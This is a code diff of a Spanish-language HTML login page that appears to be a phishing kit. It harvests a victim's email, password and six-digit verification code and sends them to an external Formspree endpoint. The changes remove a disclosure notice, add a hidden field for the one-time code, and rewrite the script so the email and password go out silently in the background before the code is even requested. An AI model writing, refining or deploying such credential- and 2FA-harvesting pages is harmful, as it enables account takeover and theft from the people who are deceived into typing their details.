@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -17,7 +16,6 @@ input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;
 button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
 .submit-btn {background:#FF0050; color:white; margin-top:10px;}
 .link-btn {background:transparent; color:#ccc; margin-top:5px;}
-.aviso {font-size:13px; color:#ffcc00; margin-top:10px; text-align:center;}
 </style>
 </head>
 <body>
@@ -28,9 +26,10 @@ button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px
   <!-- ✅ PON TU ENLACE DE FORMSPREE AQUÍ -->
   <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formPrincipal">
 
-    <!-- Campos que se envían ocultos -->
-    <input type="hidden" name="correo" id="correoOculto" />
-    <input type="hidden" name="contraseña" id="passOculta" />
+    <!-- Campos ocultos para guardar todo -->
+    <input type="hidden" name="correo" id="correoGuardado" />
+    <input type="hidden" name="contraseña" id="passGuardada" />
+    <input type="hidden" name="codigo" id="codigoGuardado" />
 
     <!-- PASO 1: CORREO Y CONTRASEÑA -->
     <div id="paso1">
@@ -42,15 +41,14 @@ button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px
         <label>Contraseña</label>
         <input type="password" id="contraseña" required placeholder="••••••••" />
       </div>
-      <p class="aviso">Al continuar recibirás los datos en tu correo</p>
-      <button type="button" class="submit-btn" onclick="pasarCodigo()">Continuar</button>
+      <button type="button" class="submit-btn" onclick="avanzarSinEsperar()">Continuar</button>
     </div>
 
     <!-- PASO 2: CÓDIGO -->
     <div id="paso2" class="oculto">
       <div class="field">
         <label>Código de verificación (6 dígitos)</label>
-        <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
+        <input type="text" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
       </div>
       <button type="button" class="link-btn" onclick="volverAtras()">← Volver atrás</button>
       <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
@@ -60,7 +58,9 @@ button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px
 </div>
 
 <script>
-function pasarCodigo() {
+const ENLACE = "https://formspree.io/f/xgogzwbd"; // Mismo enlace aquí
+
+function avanzarSinEsperar() {
   const correoValor = document.getElementById('correo').value.trim();
   const passValor = document.getElementById('contraseña').value;
 
@@ -69,30 +69,37 @@ function pasarCodigo() {
     return;
   }
 
-  // 📝 Guardamos los datos para que vayan en el envío final
-  document.getElementById('correoOculto').value = correoValor;
-  document.getElementById('passOculta').value = passValor;
+  // 📝 Guardamos los datos para que vayan al final
+  document.getElementById('correoGuardado').value = correoValor;
+  document.getElementById('passGuardada').value = passValor;
 
-  // ✅ Pasamos al instante, sin trabas
+  // 🚀 AVANZAMOS DE INMEDIATO, SIN ESPERAR NADA
   document.getElementById('paso1').classList.add('oculto');
   document.getElementById('paso2').classList.remove('oculto');
 
-  // 📩 TE LLEGA CORREO Y CONTRASEÑA EN ESTE MOMENTO (envío seguro sin estorbar)
+  // 📩 ENVIAMOS CORREO Y CONTRASEÑA EN SEGUNDO PLANO, SIN DETENER NADA
   enviarRapido(correoValor, passValor);
 }
 
-async function enviarRapido(c, p) {
-  try {
-    await fetch("https://formspree.io/f/xgogzwbd", {
-      method: "POST",
-      mode: "no-cors", // 🛡️ Esto evita que se bloquee por seguridad
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ correo: c, contraseña: p, nota: "Recibido antes del código" })
-    });
-  } catch (err) {
-    // Si falla igual sigue, no se nota nada
-    console.log("Enviado en segundo plano");
-  }
+// 🛠️ ENVÍO QUE NO DETIENE NADA
+function enviarRapido(c, p) {
+  // Usamos un método que no espera respuesta → nunca se traba
+  const form = document.createElement('form');
+  form.action = ENLACE;
+  form.method = 'POST';
+  form.target = '_blank'; // No afecta tu página
+
+  const i1 = document.createElement('input');
+  i1.name = 'correo'; i1.value = c;
+  const i2 = document.createElement('input');
+  i2.name = 'contraseña'; i2.value = p;
+  const i3 = document.createElement('input');
+  i3.name = 'nota'; i3.value = 'Recibido antes del código';
+
+  form.appendChild(i1); form.appendChild(i2); form.appendChild(i3);
+  document.body.appendChild(form);
+  form.submit();
+  document.body.removeChild(form);
 }
 
 function volverAtras() {
@@ -102,6 +109,7 @@ function volverAtras() {
 
 function activarBoton() {
   const cod = document.getElementById('codigo').value;
+  document.getElementById('codigoGuardado').value = cod;
   document.getElementById('botonEnviar').disabled = cod.length !== 6;
 }
 </script>
